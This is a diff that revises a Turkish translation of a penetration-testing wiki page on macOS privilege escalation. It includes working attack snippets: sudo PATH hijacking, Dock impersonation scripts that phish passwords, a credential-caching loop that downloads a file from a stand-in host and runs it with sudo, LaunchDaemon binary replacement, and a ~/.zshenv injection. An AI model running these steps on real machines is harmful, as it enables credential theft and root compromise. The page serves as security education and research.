@@ -1,19 +1,19 @@
-# macOS Privilege Escalation
+# macOS Yetki Yükseltme
 
 {{#include ../../banners/hacktricks-training.md}}
 
-## TCC Privilege Escalation
+## TCC Yetki Yükseltme
 
-TCC privilege escalation arıyorsanız, şuraya gidin:
+TCC yetki yükseltme hakkında bilgi arıyorsanız şuraya gidin:
 
 
 {{#ref}}
 macos-security-protections/macos-tcc/
 {{#endref}}
 
-## Linux Privesc
+## Linux Yetki Yükseltme
 
-Linux veya diğer Unix benzeri sistemleri etkileyen birçok privilege-escalation tekniği macOS için de geçerlidir. Şuraya bakın:
+Linux veya diğer Unix benzeri sistemleri etkileyen birçok yetki yükseltme tekniği macOS için de geçerlidir. Şuraya bakın:
 
 
 {{#ref}}
@@ -24,9 +24,9 @@ Linux veya diğer Unix benzeri sistemleri etkileyen birçok privilege-escalation
 
 ### Sudo Hijacking
 
-Orijinal [Sudo Hijacking tekniğini Linux Privilege Escalation yazısında](../../linux-hardening/linux-basics/linux-privilege-escalation/index.html#sudo-hijacking) bulabilirsiniz.
+Orijinal [Sudo Hijacking tekniğini Linux Yetki Yükseltme gönderisinde](../../linux-hardening/linux-basics/linux-privilege-escalation/index.html#sudo-hijacking) bulabilirsiniz.
 
-Ancak macOS, kullanıcı **`sudo`** çalıştırdığında kullanıcının **`PATH`** değişkenini **korur**. Bu da bu saldırıyı gerçekleştirmenin başka bir yolunun, kurbanın **sudo çalıştırırken** kullanmaya devam edeceği diğer ikili dosyaları **ele geçirmek** olduğu anlamına gelir:
+Ancak macOS, kullanıcı **`sudo`** çalıştırdığında kullanıcının **`PATH`** değerini **korur**. Bu, saldırıyı gerçekleştirmenin başka bir yolunun, kurbanın **sudo çalıştırırken** yürütmeye devam edeceği diğer **binary'leri ele geçirmek** olduğu anlamına gelir:
 
 ```bash
 # Let's hijack ls in /opt/homebrew/bin, as this is usually already in the users PATH
@@ -43,20 +43,20 @@ chmod +x /opt/homebrew/bin/ls
 sudo ls
 ```
 
-Terminal kullanan bir kullanıcının **Homebrew yüklemiş olma ihtimali çok yüksektir**. Bu nedenle **`/opt/homebrew/bin`** içindeki ikili dosyaları ele geçirmek mümkündür.
+Bir kullanıcının terminal kullandığında **Homebrew yüklü olma olasılığının çok yüksek** olduğunu unutmayın. Bu nedenle **`/opt/homebrew/bin`** içindeki binary’leri hijack etmek mümkündür.
 
-### Dock Taklidi
+### Dock Impersonation
 
-Biraz **social engineering** kullanarak Dock'ta örneğin **Google Chrome'u taklit edebilir** ve aslında kendi script'inizi çalıştırabilirsiniz:
+Biraz **social engineering** kullanarak Dock’ta örneğin **Google Chrome’u taklit edebilir** ve aslında kendi script’inizi çalıştırabilirsiniz:
 
 {{#tabs}}
 {{#tab name="Chrome Impersonation"}}
 Bazı öneriler:
 
-- Dock'ta Chrome olup olmadığını kontrol edin. Varsa bu girdiyi **kaldırın** ve **sahte Chrome girdisini Dock dizisinde aynı konuma ekleyin**.
+- Dock’ta Chrome olup olmadığını kontrol edin; varsa bu girdiyi **kaldırın** ve **fake** **Chrome girdisini Dock dizisinde aynı konuma ekleyin**.
 
 <details>
-<summary>Chrome Dock taklit script'i</summary>
+<summary>Chrome Dock impersonation script</summary>
 
 ```bash
 #!/bin/sh
@@ -135,14 +135,14 @@ killall Dock
 {{#tab name="Finder Impersonation"}}
 Bazı öneriler:
 
-- **Finder'ı Dock'tan kaldıramazsınız**, bu nedenle onu Dock'a ekleyecekseniz sahte Finder'ı gerçek Finder'ın hemen yanına koyabilirsiniz. Bunun için sahte Finder girdisini Dock dizisinin **başına eklemeniz gerekir**.
-- Başka bir seçenek de onu Dock'a koymayıp doğrudan açmaktır; "Finder'ın Finder'ı denetlemek istemesi" pek de garip değil.
-- Korkunç bir kutu göstererek parola sormadan **root yetkilerine yükselmenin** başka bir yolu, Finder'ın ayrıcalıklı bir işlem gerçekleştirmek için gerçekten parola istemesini sağlamaktır:
-  - Finder'dan **`/etc/pam.d`** dizinine yeni bir **`sudo`** dosyası kopyalamasını isteyin (Parola isteyen uyarıda "Finder sudo dosyasını kopyalamak istiyor" yazar.)
-  - Finder'dan yeni bir **Authorization Plugin** kopyalamasını isteyin (Dosya adını kontrol ederek parola isteyen uyarıda "Finder Finder.bundle dosyasını kopyalamak istiyor" yazmasını sağlayabilirsiniz.)
+- **Finder'ı Dock'tan kaldıramazsınız**, bu yüzden onu Dock'a ekleyecekseniz sahte Finder'ı gerçek olanın hemen yanına koyabilirsiniz. Bunun için **sahte Finder girdisini Dock dizisinin başına eklemeniz** gerekir.
+- Başka bir seçenek de onu Dock'a yerleştirmeyip yalnızca açmaktır; "Finder'ın Finder'ı denetlemek istemesi" o kadar da tuhaf değil.
+- Korkunç bir kutu göstererek parola sormadan **root yetkilerini elde etmenin** başka bir yolu, Finder'a ayrıcalıklı bir işlem gerçekleştirmek için gerçekten parola sordurmaktır:
+  - Finder'dan **`/etc/pam.d`** dizinine yeni bir **`sudo`** dosyası kopyalamasını isteyin (Parola isteyen istemde "Finder sudo dosyasını kopyalamak istiyor" yazacaktır.)
+  - Finder'dan yeni bir **Authorization Plugin** kopyalamasını isteyin (Dosya adını kontrol ederek parola isteyen istemde "Finder Finder.bundle dosyasını kopyalamak istiyor" yazmasını sağlayabilirsiniz.)
 
 <details>
-<summary>Finder Dock kimliğine bürünme betiği</summary>
+<summary>Finder Dock taklit etme betiği</summary>
 
 ```bash
 #!/bin/sh
@@ -219,15 +219,15 @@ killall Dock
 {{#endtab}}
 {{#endtabs}}
 
-### Password prompt phishing + sudo reuse
+### Parola istemi phishing'i + sudo yeniden kullanımı
 
-Malware, kullanıcı etkileşimini kötüye kullanarak **sudo yetkisi olan bir parolayı ele geçirir** ve bunu programatik olarak yeniden kullanır. Yaygın bir akış:
+Malware, **sudo yetkisine sahip bir parolayı ele geçirmek** ve programatik olarak yeniden kullanmak için sık sık kullanıcı etkileşiminden yararlanır. Yaygın bir akış:
 
-1. `whoami` ile oturum açmış kullanıcıyı belirle.
-2. `dscl . -authonly "$user" "$pw"` başarılı olana kadar parola istemlerini **döngüye al**.
-3. Kimlik bilgisini önbelleğe al (ör. `/tmp/.pass`) ve ayrıcalıklı işlemleri `sudo -S` ile yürüt (parola stdin üzerinden).
+1. `whoami` ile oturum açmış kullanıcıyı belirleyin.
+2. `dscl . -authonly "$user" "$pw"` başarı döndürene kadar **parola istemlerini döngüye alın**.
+3. Kimlik bilgisini önbelleğe alın (ör. `/tmp/.pass`) ve ayrıcalıklı işlemleri `sudo -S` ile gerçekleştirin (parolayı stdin üzerinden iletin).
 
-En basit zincir örneği:
+Örnek minimal zincir:
 
 ```bash
 user=$(whoami)
@@ -240,13 +240,19 @@ curl -o /tmp/update https://example.com/update
 printf '%s\n' "$pw" | sudo -S xattr -c /tmp/update && chmod +x /tmp/update && /tmp/update
 ```
 
-Çalınan parola daha sonra **`xattr -c` ile Gatekeeper karantinasını kaldırmak**, LaunchDaemons veya diğer ayrıcalıklı dosyaları kopyalamak ve ek aşamaları etkileşimsiz olarak çalıştırmak için yeniden kullanılabilir.<sup>[[1]](#references)</sup>
+Çalınan parola daha sonra **`xattr -c` ile Gatekeeper karantinasını kaldırmak**, LaunchDaemons veya diğer ayrıcalıklı dosyaları kopyalamak ve ek aşamaları etkileşim olmadan çalıştırmak için yeniden kullanılabilir.<sup>[[1]](#references)</sup>
 
-## Yeni macOS'e özgü vektörler (2023–2026)
+#### Yakalanan parolaları PAM üzerinden doğrulama
 
-### Kullanımdan kaldırılan `AuthorizationExecuteWithPrivileges` hâlâ kullanılabiliyor
+Yerel görünümlü, güvenli bir metin istemi aday hesap parolasını toplayabilir ve `dscl`, `security` veya `osascript` başlatmak yerine bunu süreç içinde PAM aracılığıyla doğrulayabilir. Çağıran taraf `pam_start` ile bir PAM işlemi başlatır, bir conversation callback aracılığıyla aday parolayı iletir, `pam_authenticate` çağrısını yapar ve işlemi `pam_end` ile sonlandırır. Doğrulama başarısız olursa parola alanına geri dönülebilir; başarılı olursa ayrı bir doğrulama süreci başlatmadan parolanın doğruluğu teyit edilir. PAM kimlik doğrulaması tek başına çağıran tarafa **ayrıcalık kazandırmaz** veya ayrıcalıklı işlemlere izin vermez.<sup>[[9]](#references)[[10]](#references)</sup>
 
-`AuthorizationExecuteWithPrivileges`, 10.7'de kullanımdan kaldırıldı ancak **Sonoma/Sequoia'da hâlâ çalışıyor**. Pek çok ticari güncelleyici, güvenilmeyen bir yol ile `/usr/libexec/security_authtrampoline` çağırıyor. Hedef binary kullanıcı tarafından yazılabilir durumdaysa bir trojan yerleştirip meşru istemden yararlanabilirsiniz:
+Giriş parolası ile Keychain parolası eşleşiyorsa yakalanan parola, mevcut Keychain parolasını gerektiren işlemlerde de kullanılabilir; bkz. [Keychain ACL ve partition-list kısıtlamaları](../macos-red-teaming/macos-keychain.md).<sup>[[10]](#references)</sup>
+
+## Daha yeni macOS'e özgü vektörler (2023–2026)
+
+### Kullanımdan kaldırılan `AuthorizationExecuteWithPrivileges` hâlâ kullanılabilir
+
+`AuthorizationExecuteWithPrivileges`, 10.7'de kullanımdan kaldırıldı ancak **Sonoma/Sequoia'da hâlâ çalışıyor**. Birçok ticari güncelleyici, güvenilmeyen bir yol ile `/usr/libexec/security_authtrampoline` çağırır. Hedef binary kullanıcı tarafından yazılabiliyorsa bir trojan yerleştirip meşru istemden yararlanabilirsiniz:
 
 ```bash
 # find vulnerable helper calls
@@ -258,14 +264,14 @@ chmod +x /Users/me/Library/Application\ Support/Target/helper
 # when the app updates, the root prompt spawns your payload
 ```
 
-**Yukarıdaki masquerading tricks** ile birleştirerek inandırıcı bir parola iletişim kutusu gösterin.
+Yukarıdaki **masquerading tricks** ile birleştirerek inandırıcı bir parola penceresi sunun.
 
 
-### Ayrıcalıklı yardımcı / XPC ön incelemesi
+### Privileged helper / XPC triage
 
-Modern üçüncü taraf macOS privesc’lerinin çoğu aynı örüntüyü izler: **root LaunchDaemon**, **`/Library/PrivilegedHelperTools`** içinden bir **Mach/XPC service** sunar; ardından yardımcı ya **client’ı doğrulamaz**, **çok geç doğrular** (PID race) ya da **user-controlled path/script** kullanan bir **root method** sunar. VPN istemcileri, oyun başlatıcıları ve güncelleyicilerdeki yakın tarihli birçok helper hatasının arkasında bu hata sınıfı vardır.<sup>[[2]](#references)</sup>
+Modern üçüncü taraf macOS privesc açıklarının çoğu aynı kalıbı izler: **root LaunchDaemon**, **`/Library/PrivilegedHelperTools`** içinden bir **Mach/XPC service** sunar; ardından helper ya **client'ı doğrulamaz**, doğrulamayı **çok geç yapar** (PID race) ya da **user-controlled path/script** kullanan bir **root method** sunar. VPN client'ları, game launcher'lar ve updater'lardaki yakın tarihli birçok helper bug'ının arkasında bu bug sınıfı vardır.<sup>[[2]](#references)</sup>
 
-Hızlı ön inceleme kontrol listesi:
+Hızlı triage kontrol listesi:
 
 ```bash
 ls -l /Library/PrivilegedHelperTools /Library/LaunchDaemons
@@ -279,17 +285,17 @@ done
 
 Özellikle şu özelliklere sahip helper'lara dikkat edin:
 
-- iş `launchd`'de yüklü kaldığı için **kaldırma işleminden sonra** istekleri kabul etmeye devam edenler
-- **`/Applications/...`** veya root olmayan kullanıcıların yazabildiği diğer yollardan script çalıştıran ya da yapılandırma okuyanlar
-- yarış koşuluna açık olabilecek **PID tabanlı** veya yalnızca **bundle-id** kullanan eş doğrulamasına dayananlar
+- job `launchd` içinde yüklü kaldığı için **uninstall işleminden sonra** istekleri kabul etmeye devam etmeleri
+- script'leri çalıştırmaları veya yapılandırmayı **`/Applications/...`** ya da root olmayan kullanıcıların yazabildiği başka yollardan okumaları
+- raceable olabilecek **PID tabanlı** veya yalnızca **bundle-id** kullanan peer doğrulamasına güvenmeleri
 
-Helper yetkilendirme hataları hakkında daha fazla bilgi için [bu sayfaya](macos-proces-abuse/macos-ipc-inter-process-communication/macos-xpc/macos-xpc-authorization.md) bakın.
+Helper authorization bug'ları hakkında daha fazla bilgi için [bu sayfayı](macos-proces-abuse/macos-ipc-inter-process-communication/macos-xpc/macos-xpc-authorization.md) inceleyin.
 
-### PackageKit script ortamı devralma (CVE-2024-27822)
+### PackageKit script ortamı mirası (CVE-2024-27822)
 
-Apple **Sonoma 14.5**, **Ventura 13.6.7** ve **Monterey 12.7.5** sürümlerinde bu sorunu giderene kadar, kullanıcı tarafından başlatılan **`Installer.app`** / **`PackageKit.framework`** kurulumları **PKG script'lerini root olarak, mevcut kullanıcının ortamında** çalıştırabiliyordu. Bu, **`#!/bin/zsh`** kullanan bir paketin, kurban paketi yüklediğinde saldırganın **`~/.zshenv`** dosyasını yükleyip root olarak çalıştırabileceği anlamına gelir.<sup>[[3]](#references)</sup>
+Apple **Sonoma 14.5**, **Ventura 13.6.7** ve **Monterey 12.7.5** sürümlerinde düzeltme yapana kadar, kullanıcı tarafından başlatılan **`Installer.app`** / **`PackageKit.framework`** kurulumları, **PKG script'lerini root olarak mevcut kullanıcının ortamında** çalıştırabiliyordu. Bu, **`#!/bin/zsh`** kullanan bir paketin, kurban paketi yüklerken saldırganın **`~/.zshenv`** dosyasını yükleyip root olarak çalıştırabileceği anlamına gelir.<sup>[[3]](#references)</sup>
 
-Bu durum özellikle bir **logic bomb** olarak ilgi çekicidir: kullanıcının hesabında bir foothold ve yazılabilir bir shell başlangıç dosyası yeterlidir; ardından kullanıcının zsh tabanlı savunmasız herhangi bir installer'ı çalıştırmasını beklersiniz. Bu genellikle **MDM/Munki** dağıtımları için geçerli değildir; çünkü bunlar root kullanıcısının ortamında çalışır.<sup>[[3]](#references)</sup>
+Bu durum, bir **logic bomb** olarak özellikle ilgi çekicidir: Kullanıcı hesabında bir foothold ve yazılabilir bir shell başlangıç dosyası bulundurmanız yeterlidir; ardından kullanıcının zsh tabanlı herhangi bir güvenlik açığı bulunan installer'ı çalıştırmasını beklersiniz. Bu durum genellikle **MDM/Munki** dağıtımları için geçerli değildir; çünkü bunlar root kullanıcısının ortamında çalışır.<sup>[[3]](#references)</sup>
 
 ```bash
 # inspect a vendor pkg for shell-based install scripts
@@ -301,20 +307,20 @@ rg -n '^#!/bin/(zsh|bash)' /tmp/target-pkg
 echo 'id > /tmp/pkg-root' >> ~/.zshenv
 ```
 
-Daha ayrıntılı şekilde installer odaklı kötüye kullanımı incelemek isterseniz [bu sayfaya](macos-files-folders-and-binaries/macos-installers-abuse.md) da göz atın.
+Daha derinlemesine installer-özel kötüye kullanım örnekleri için [bu sayfaya](macos-files-folders-and-binaries/macos-installers-abuse.md) da göz atın.
 
-### `.localized` üzerinden installer hedef çakışması
+### `.localized` aracılığıyla installer hedef çakışması
 
-Bazı üçüncü taraf installer'lar, çalıştırılabilir dosyasına `/Applications/Target.app` içinde sabit bir yol üzerinden başvurulan bir root LaunchDaemon kaydeder. Bir saldırgan bu bundle'ı önce **farklı bir bundle identifier** ile oluşturabilirse Installer, yem olarak oluşturulan bundle'ı koruyup gerçek uygulamayı `/Applications/Target.localized/Target.app` konumuna yerleştirebilir. Daemon yine de ilk yola işaret eder. Bu nedenle, yem bundle'ın içindeki saldırgan denetimindeki bir çalıştırılabilir dosya daha sonra root olarak çalışabilir.<sup>[[8]](#references)</sup>
+Bazı üçüncü taraf installer’lar, yürütülebilir dosyasına `/Applications/Target.app` içinde sabit bir yolla başvurulan bir root LaunchDaemon kaydeder. Bir saldırgan bu bundle’ı önce **farklı bir bundle identifier** ile oluşturabiliyorsa Installer sahte bundle’ı koruyup gerçek uygulamayı `/Applications/Target.localized/Target.app` konumuna yerleştirebilir. Daemon yine de özgün yolu işaret eder. Bu nedenle, sahte bundle içindeki saldırgan denetimindeki bir yürütülebilir dosya daha sonra root olarak çalıştırılabilir.<sup>[[8]](#references)</sup>
 
 Önemli ön koşullar şunlardır:<sup>[[8]](#references)</sup>
 
 1. Saldırgan beklenen uygulama yolunu oluşturabilir veya denetleyebilir.
-2. Paket, çakışan bundle'ı kaldırmaz.
-3. Ayrıcalıklı iş, bu bundle içindeki sabit kodlanmış bir yolu kullanır.
+2. Paket çakışan bundle’ı kaldırmaz.
+3. Ayrıcalıklı iş, bu bundle içinde sabit kodlanmış bir yol kullanır.
 4. Kullanıcı veya bir MDM iş akışı paketi yükler ve işi kaydeder.
 
-Yer değiştirmiş bundle'ları bulun ve ardından sonraki bölümdeki enumeration döngüsüyle LaunchDaemon hedeflerini inceleyin:<sup>[[8]](#references)</sup>
+Yeri değiştirilmiş bundle’ları bulun ve ardından sonraki bölümdeki enumeration döngüsüyle LaunchDaemon hedeflerini inceleyin:<sup>[[8]](#references)</sup>
 
 ```bash
 find /Applications -type d -name '*.localized' -prune -print
@@ -323,11 +329,11 @@ for app in /Applications/*.app; do
 done
 ```
 
-Daha güvenli bir installer, bundle'ın nihai konumunu çözümler ve ayrıcalıklı executable dosyalarını `/Library/PrivilegedHelperTools` gibi root sahipli bir konumda tutar. Ayrıca job'ı kaydetmeden veya başlatmadan önce sahipliği ve code signing'i doğrulamalıdır.<sup>[[8]](#references)</sup>
+Daha güvenli bir yükleyici, bundle'ın son konumunu çözümler ve ayrıcalıklı yürütülebilir dosyaları `/Library/PrivilegedHelperTools` gibi root sahipliğindeki bir konumda tutar. Ayrıca job'u kaydetmeden veya başlatmadan önce sahipliği ve code signing'i doğrulamalıdır.<sup>[[8]](#references)</sup>
 
-### Yazılabilir LaunchDaemon hedefinin ele geçirilmesi
+### Yazılabilir LaunchDaemon hedefini ele geçirme
 
-Bir LaunchDaemon plist dosyası root sahipli olabilir, ancak `Program` veya ilk `ProgramArguments` girdisi kullanıcının yazabildiği bir dizini gösterebilir. Yalnızca executable dosyasının izinlerini değil, **yolun tamamını** kontrol edin. Üst dizin yazılabiliyorsa saldırgan, root sahipli bir executable dosyasının adını değiştirebilir ve aynı yolda onun yerine geçecek bir dosya oluşturabilir. Bu dosya, job bir sonraki başlatıldığında root olarak çalışır. Yeniden başlatma veya normal bir servis yeniden başlatması yeterlidir. Saldırganın system domain'de `launchctl bootstrap` çalıştırma iznine ihtiyacı yoktur.<sup>[[7]](#references)</sup>
+Bir LaunchDaemon plist'i root sahipliğinde olabilirken `Program` veya ilk `ProgramArguments` girdisi kullanıcı tarafından yazılabilir bir dizine işaret ediyor olabilir. Yalnızca yürütülebilir dosyanın izinlerini değil, **yolun tamamını** kontrol edin. Üst dizin yazılabilirse saldırgan, root sahipliğindeki yürütülebilir dosyayı yeniden adlandırıp aynı yola bir ikame dosya oluşturabilir. Job bir sonraki başlatıldığında ikame dosya root olarak çalışır. Yeniden başlatma veya olağan bir servis yeniden başlatması yeterlidir. Saldırganın system domain'de `launchctl bootstrap` çalıştırma iznine ihtiyacı yoktur.<sup>[[7]](#references)</sup>
 
 Önce her hedefi ve doğrudan üst dizinini listeleyin:<sup>[[7]](#references)</sup>
 
@@ -342,7 +348,7 @@ for p in /Library/LaunchDaemons/*.plist; do
 done
 ```
 
-Dosya veya üst dizini yazılabilir olduğunda, özgün binary'yi koruyup yolu çalıştırılabilir bir payload ile değiştirin. Ardından önceden yüklenmiş daemon'ın yeniden başlamasını bekleyin.<sup>[[7]](#references)</sup>
+Dosya veya üst dizini yazılabilir olduğunda, özgün binary'yi koruyun ve yolu çalıştırılabilir bir payload ile değiştirin. Ardından önceden yüklenmiş daemon'ın yeniden başlamasını bekleyin.<sup>[[7]](#references)</sup>
 
 ```bash
 target=/path/from/the/plist
@@ -351,9 +357,9 @@ cp /tmp/payload "$target"
 chmod 755 "$target"
 ```
 
-### XNU SMR kimlik bilgisi işaretçisi race (CVE-2025-24118)
+### XNU SMR credential-pointer race (CVE-2025-24118)
 
-Güvenlik açığı içeren `kauth_cred_proc_update` yolu, SMR okuyucuları işaretçiyi kilit kullanmadan yüklerken `proc_ro.p_ucred` değerini atomik olmayan `zalloc_ro_mut` API’siyle güncelliyordu. Herkese açık tetikleyici, özel olarak hazırlanmış bir setgid binary kullanır. Bir thread gerçek ve etkin grup kimlikleri arasında geçiş yaparken başka bir thread `getgid()` gibi bir syscall’a tekrar tekrar girer.<sup>[[4]](#references)</sup>
+Savunmasız `kauth_cred_proc_update` yolu, SMR okuyucuları işaretçiyi kilit kullanmadan yüklerken `proc_ro.p_ucred` değerini atomik olmayan `zalloc_ro_mut` API'siyle güncelliyordu. Herkese açık tetikleyici, özel olarak hazırlanmış bir setgid binary kullanır. Bir thread gerçek ve etkin grup kimlikleri arasında geçiş yaparken başka bir thread, `getgid()` gibi bir syscall'a tekrar tekrar girer.<sup>[[4]](#references)</sup>
 
 ```c
 // Writer thread inside a setgid binary
@@ -365,25 +371,25 @@ while (1) {
 while (1) observed_gid = getgid();
 ```
 
-Bunu hazır bir root exploit değil, bir **race primitive** olarak değerlendirin. Yayımlanan PoC, parçalanmış bir credential pointer gösteriyor. Bu genellikle kernel panic ile sonuçlanıyor. Araştırmacı bozulmayı yalnızca Intel üzerinde yeniden üretebildi ve ortaya çıkan credential nesnesi üzerinde deterministik kontrol sağlayamadı. Apple, macOS 15.3'te güncellemeyi atomik bir pointer değişimiyle yaptı.<sup>[[4]](#references)</sup>
+Bunu hazır bir root exploit olarak değil, **race primitive** olarak değerlendirin. Yayımlanan PoC, parçalanmış bir kimlik bilgisi işaretçisini gösteriyor. Genellikle kernel panic ile sonuçlanıyor. Araştırmacı bozulmayı yalnızca Intel üzerinde yeniden üretti ve ortaya çıkan credential object üzerinde deterministik kontrol sağlayamadı. Apple, macOS 15.3'te güncellemeyi atomik bir pointer exchange olarak değiştirdi.<sup>[[4]](#references)</sup>
 
 ### Migration Assistant üzerinden SIP bypass ("Migraine", CVE-2023-32369)
 
-Zaten root yetkiniz olsa bile SIP, sistem konumlarına yazmayı engeller. **Migraine** açığı, Migration Assistant yetkilendirmesi `com.apple.rootless.install.heritable` üzerinden SIP bypass'ı miras alan ve korumalı yolların (ör. `/System/Library/LaunchDaemons`) üzerine yazan bir alt süreç başlatır.<sup>[[5]](#references)</sup> Saldırı zinciri:
+Root erişiminiz olsa bile SIP, sistem konumlarına yazmayı engeller. **Migraine** hatası, Migration Assistant yetkisi `com.apple.rootless.install.heritable`'ı kötüye kullanarak SIP bypass yetkisini devralan bir child process başlatır ve korumalı yolların (ör. `/System/Library/LaunchDaemons`) üzerine yazar.<sup>[[5]](#references)</sup> Saldırı zinciri:
 
-1. Çalışan bir sistemde root yetkisi elde edin.
-2. Saldırganın kontrolündeki bir ikili dosyayı çalıştırması için `systemmigrationd` sürecini hazırlanmış durum verileriyle tetikleyin.
-3. SIP korumalı dosyalara yama uygulamak için miras alınan yetkilendirmeyi kullanın; yapılan değişiklikler yeniden başlatma sonrasında da kalıcı olur.
+1. Çalışan bir sistemde root erişimi elde edin.
+2. Saldırganın denetimindeki bir binary'yi çalıştırmak için `systemmigrationd`'i hazırlanmış bir durumla tetikleyin.
+3. SIP tarafından korunan dosyalara yama uygulamak için devralınan yetkiyi kullanın; bu değişiklikler yeniden başlatmadan sonra da kalıcı olur.
 
-### NSPredicate/XPC ifade kaçakçılığı (CVE-2023-23530/23531 hata sınıfı)
+### NSPredicate/XPC expression smuggling (CVE-2023-23530/23531 hata sınıfı)
 
-Birden fazla Apple daemon'u XPC üzerinden **NSPredicate** nesnelerini kabul eder ve yalnızca saldırgan tarafından kontrol edilebilen `expressionType` alanını doğrular. Rastgele selector'ları değerlendiren bir predicate hazırlayarak **root/system XPC servislerinde** (ör. `coreduetd`, `contextstored`) **code execution** elde edebilirsiniz. İlk olarak bir uygulama sandbox'ından kaçışla birleştirildiğinde bu, **kullanıcıdan onay almadan yetki yükseltme** sağlar. Predicate'leri deserialize eden ve sağlam bir visitor kullanmayan XPC uç noktalarını araştırın.<sup>[[6]](#references)</sup>
+Birden fazla Apple daemon'ı XPC üzerinden **NSPredicate** nesnelerini kabul ediyor ve yalnızca saldırganın kontrolündeki `expressionType` alanını doğruluyor. Keyfi selector'ları değerlendiren bir predicate hazırlayarak **root/system XPC servislerinde kod yürütme** sağlayabilirsiniz (ör. `coreduetd`, `contextstored`). İlk uygulama sandbox escape'i ile birleştirildiğinde, bu **kullanıcıya istem gösterilmeden privilege escalation** sağlar. Predicate'leri deserialize eden ve sağlam bir visitor kullanmayan XPC endpoint'lerini araştırın.<sup>[[6]](#references)</sup>
 
 ## TCC - Root Yetki Yükseltme
 
 ### CVE-2020-9771 - mount_apfs TCC bypass ve yetki yükseltme
 
-**Herhangi bir kullanıcı** (yetkisiz kullanıcılar bile) `-o noowners` seçeneğiyle bir Time Machine snapshot'ı oluşturup bağlayabilir ve bu snapshot'taki **TÜM dosyalara erişebilir**; böylece canlı volume üzerindeki sahiplik denetimlerini atlatabilir. Gereken tek yetki, kullanılan uygulamanın (ör. `Terminal`) **Full Disk Access** (`kTCCServiceSystemPolicyAllfiles`) iznine sahip olmasıdır.
+**Herhangi bir kullanıcı** (ayrıcalıksız olanlar bile) `-o noowners` ile bir Time Machine snapshot'ı oluşturup bağlayabilir ve canlı volume'daki sahiplik denetimlerini atlatarak snapshot'taki **TÜM dosyalara erişebilir**. Gerekli tek ayrıcalık, kullanılan uygulamanın (ör. `Terminal`) **Full Disk Access** (`kTCCServiceSystemPolicyAllfiles`) yetkisine sahip olmasıdır.
 
 Komutlar ve açıklamanın tamamı TCC bypasses sayfasında:
 
@@ -393,7 +399,7 @@ macos-security-protections/macos-tcc/macos-tcc-bypasses/README.md
 
 ## Hassas Bilgiler
 
-Bu, yetki yükseltmek için faydalı olabilir:
+Bunlar yetki yükseltmek için kullanılabilir:
 
 
 {{#ref}}
@@ -402,14 +408,17 @@ macos-files-folders-and-binaries/macos-sensitive-locations.md
 
 
 
+{{#include ../../banners/hacktricks-training.md}}
+
 ## References
 
-- [1] [Pentest Partners - 2025, Infostealer yılı](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
-- [2] [CVE-2024-30165: macOS için AWS Client VPN'de Yerel Yetki Yükseltme](https://blog.emkay64.com/macos/CVE-2024-30165-finding-and-exploiting-aws-client-vpn-on-macos-for-local-privilege-escalation/)
-- [3] [CVE-2024-27822: macOS PackageKit'te Yetki Yükseltme](https://khronokernel.com/macos/2024/06/03/CVE-2024-27822.html)
+- [1] [Pentest Partners - 2025, infostealer'ların yılı](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
+- [2] [CVE-2024-30165: macOS için AWS Client VPN Yerel Yetki Yükseltme](https://blog.emkay64.com/macos/CVE-2024-30165-finding-and-exploiting-aws-client-vpn-on-macos-for-local-privilege-escalation/)
+- [3] [CVE-2024-27822: macOS PackageKit Yetki Yükseltme](https://khronokernel.com/macos/2024/06/03/CVE-2024-27822.html)
 - [4] [TRAVERTINE: CVE-2025-24118](https://jprx.io/cve-2025-24118/)
 - [5] [Microsoft "Migraine" SIP bypass (CVE-2023-32369)](https://www.microsoft.com/en-us/security/blog/2023/05/30/new-macos-vulnerability-migraine-could-bypass-system-integrity-protection/)
 - [6] [Trellix Advanced Research Center - macOS ve iOS'ta yeni bir yetki yükseltme hata sınıfı (CVE-2023-23530/23531)](https://www.trellix.com/en-sg/blogs/research/trellix-advanced-research-center-discovers-a-new-privilege-escalation-bug-class-on-macos-and-ios/)
 - [7] [LaunchDaemon Hijacking: güvenli olmayan klasör izinleri üzerinden yetki yükseltme ve kalıcılık](https://bradleyjkemp.dev/post/launchdaemon-hijacking/)
 - [8] [macOS'ta .localized dizini üzerinden LPE](https://theevilbit.github.io/posts/localized/)
-{{#include ../../banners/hacktricks-training.md}}
+- [9] [Jamf Threat Labs - PamStealer: pano yöneticisi uygulaması gibi görünen macOS zararlısı](https://www.jamf.com/blog/pamstealer-macos-infostealer-applescript-rust/)
+- [10] [Kaspersky Securelist - MacSync mercek altında](https://securelist.com/macsync-new-version/121383/)
